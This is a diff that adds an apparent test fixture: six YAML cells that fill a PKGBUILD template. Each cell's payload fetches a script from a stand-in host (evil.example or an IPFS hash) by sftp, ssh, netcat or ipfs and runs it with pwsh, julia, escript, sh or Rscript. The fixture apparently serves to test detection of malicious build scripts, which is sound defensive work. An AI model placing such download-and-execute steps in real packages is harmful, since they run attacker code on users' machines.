@@ -1,0 +1,34 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.ps1"
+        pwsh < s.ps1
+  id: 01-sftp-pwsh-stdin
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.jl"
+        julia < s.jl
+  id: 02-sftp-julia-stdin
+- vars:
+    payload: |2
+        cd "$srcdir"
+        ipfs get QmPayload123
+        escript QmPayload123/f.erl
+  id: 03-ipfs-get-escript
+- vars:
+    payload: |2
+        cd "$srcdir"
+        ssh u@evil.example tar -C / -cf - s.sh | tar -xf -
+        sh -s < s.sh
+  id: 04-sshtar-shstdin
+- vars:
+    payload: |2
+        netcat evil.example 4444 > f.jl
+        julia f.jl
+  id: 05-netcat-julia
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.R"
+        Rscript < s.R
+  id: 06-sftp-Rscript-stdin
